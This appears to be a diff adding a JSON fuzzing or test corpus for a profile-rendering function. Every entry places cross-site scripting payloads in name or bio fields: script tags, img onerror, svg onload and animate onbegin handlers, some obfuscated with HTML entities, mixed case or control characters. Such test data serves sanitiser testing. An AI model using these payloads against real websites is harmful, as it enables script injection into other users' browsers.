@@ -1,0 +1,63 @@
+[
+ {
+  "hex": "ed",
+  "arguments": "{'person_name': '<img src=x onerror=alert(1)>', 'user_bio': 'Software engineer from xyz.', 'status_message': 'Feeling great!'}",
+  "family": [
+   "event_handler"
+  ]
+ },
+ {
+  "hex": "ed18",
+  "arguments": "{'person_name': '<svg onload=alert(1)>', 'user_bio': 'Software engineer from xyz.', 'status_message': 'Feeling great!'}",
+  "family": [
+   "svg_event_handler"
+  ]
+ },
+ {
+  "hex": "2121",
+  "arguments": "{'person_name': '<script>alert(1)</script>', 'user_bio': 'Software engineer from xyz.', 'status_message': 'Feeling great!'}",
+  "family": [
+   "script_element"
+  ]
+ },
+ {
+  "hex": "ede0e099e0e0e096",
+  "arguments": "{'person_name': '<img src=x onerror=alert(1)>', 'user_bio': '<svg onload=alert(1)>', 'status_message': 'Feeling great!'}",
+  "family": [
+   "event_handler",
+   "svg_event_handler"
+  ]
+ },
+ {
+  "hex": "ed00ffffff6d6d6d6d01e2",
+  "arguments": "{'person_name': '&lt;img src=x onerror=alert(1)&gt;\\x7fmmm', 'user_bio': '<img src=x onerror=alert(1)>', 'status_message': 'Feeling great!'}",
+  "family": [
+   "event_handler",
+   "html_entity_obfuscation"
+  ]
+ },
+ {
+  "hex": "ed494949bdb6b6b6494949",
+  "arguments": "{'person_name': \"I=66<ScRiPt>alert('xss')</sCrIpT>\", 'user_bio': '<img src=x onerror=alert(1)>', 'status_message': 'Feeling great!'}",
+  "family": [
+   "event_handler",
+   "script_element"
+  ]
+ },
+ {
+  "hex": "ed1d1d1d1d1d1d1d1d1d1d1d1d1d1d1d1d1d1d1d1d21",
+  "arguments": "{'person_name': \"\\x1d\\x1d\\x1d\\x1d<ScRiPt>alert('xss')</sCrIpT>\\x1d\\x1d\\x1d\\x1d\", 'user_bio': '\\x1d\\x1d<svg><animate onbegin=alert(1)>', 'status_message': 'Feeling great!'}",
+  "family": [
+   "script_element",
+   "svg_event_handler"
+  ]
+ },
+ {
+  "hex": "ed11131313131313131313131313131313131313131342",
+  "arguments": "{'person_name': '\\x13\\x13\\x13\\x13&lt;img src=x onerror=alert(1)&gt;\\x13\\x13\\x13\\x13', 'user_bio': '\\x13\\x13\\x13<svg><animate onbegin=alert(1)>', 'status_message': 'Feeling great!'}",
+  "family": [
+   "html_entity_obfuscation",
+   "svg_event_handler"
+  ]
+ }
+]
